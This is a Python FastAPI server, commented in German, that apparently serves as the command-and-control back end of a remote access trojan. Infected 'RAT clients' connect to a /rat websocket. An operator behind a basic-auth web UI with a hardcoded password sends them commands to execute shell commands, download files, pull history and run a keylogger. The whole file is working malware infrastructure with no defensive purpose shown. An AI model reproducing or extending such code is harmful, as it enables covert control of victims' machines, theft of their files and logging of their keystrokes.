import asyncio
import json
import base64
import os
from datetime import datetime
import secrets

import uvicorn
from fastapi import (
    FastAPI,
    WebSocket,
    WebSocketDisconnect,
    Depends,
    HTTPException,
    status,
)
from fastapi.responses import FileResponse
from fastapi.security import HTTPBasic, HTTPBasicCredentials

# --- Globale Variablen & App-Initialisierung ---
RAT_CLIENTS = {}
CLIENT_COUNTER = 1
WEB_UI_SOCKET: WebSocket | None = None
app = FastAPI()

# --- Basic Auth Konfiguration ---
security = HTTPBasic()
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "supersecretpassword123"


# --- AUTH-FUNKTION FÜR NORMALE HTTP-ROUTEN ---
async def get_current_user(credentials: HTTPBasicCredentials = Depends(security)):
    correct_username = secrets.compare_digest(
        credentials.username, ADMIN_USERNAME
    )
    correct_password = secrets.compare_digest(
        credentials.password, ADMIN_PASSWORD
    )
    if not (correct_username and correct_password):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Falsche Anmeldeinformationen",
            headers={"WWW-Authenticate": "Basic"},
        )
    return credentials.username


# --- Web-UI Endpunkte ---
@app.get("/", dependencies=[Depends(get_current_user)])
async def get_index():
    return FileResponse("index.html")


@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    global WEB_UI_SOCKET
    await websocket.accept()
    WEB_UI_SOCKET = websocket
    print("Web-UI verbunden.")
    
    await send_to_web_ui(
        {
            "type": "client_list",
            "clients": [
                {"id": cid, "address": getattr(ws, 'remote_address', 'unknown')}
                for cid, ws in RAT_CLIENTS.items()
            ],
        }
    )
    try:
        while True:
            data = await websocket.receive_json()
            action = data.get("action")
            target_id = data.get("target_id")
            if not target_id or target_id not in RAT_CLIENTS:
                await send_to_web_ui(
                    {"type": "error", "message": "Client nicht gefunden oder nicht ausgewählt."}
                )
                continue
            target_ws = RAT_CLIENTS[target_id]
            payload = {"action": action}
            if action == "exec":
                payload["command"] = data.get("command")
            elif action == "download":
                payload["path"] = data.get("path")
            elif action == "history":
                payload["limit"] = data.get("limit")
            elif action == "keylogger":
                payload["count"] = data.get("count")
            try:
                await target_ws.send_json(payload)
            except Exception:
                await send_to_web_ui(
                    {"type": "error", "message": f"Verbindung zu Client {target_id} verloren."}
                )
    except WebSocketDisconnect:
        print("Web-UI hat die Verbindung getrennt.")
        WEB_UI_SOCKET = None


# --- RAT-Client WebSocket Endpunkt ---
@app.websocket("/rat")
async def rat_client_endpoint(websocket: WebSocket):
    global CLIENT_COUNTER
    await websocket.accept()
    
    client_id = CLIENT_COUNTER
    CLIENT_COUNTER += 1
    RAT_CLIENTS[client_id] = websocket
    
    # Remote address für FastAPI WebSocket
    client_host = websocket.client.host if websocket.client else "unknown"
    client_port = websocket.client.port if websocket.client else 0
    remote_address = (client_host, client_port)
    websocket.remote_address = remote_address
    
    print(f"[+] Neuer RAT-Client verbunden: ID {client_id} von {remote_address}")
    await send_to_web_ui(
        {
            "type": "client_connected",
            "client": {"id": client_id, "address": remote_address},
        }
    )
    
    try:
        while True:
            data = await websocket.receive_json()
            data["client_id"] = client_id
            await send_to_web_ui(data)
    except WebSocketDisconnect:
        print(f"[-] RAT-Client {client_id} hat die Verbindung getrennt.")
    finally:
        if client_id in RAT_CLIENTS:
            del RAT_CLIENTS[client_id]
            await send_to_web_ui({"type": "client_disconnected", "client_id": client_id})


# --- Hilfsfunktion ---
async def send_to_web_ui(data: dict):
    if WEB_UI_SOCKET:
        try:
            await WEB_UI_SOCKET.send_json(data)
        except Exception:
            pass


if __name__ == "__main__":
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)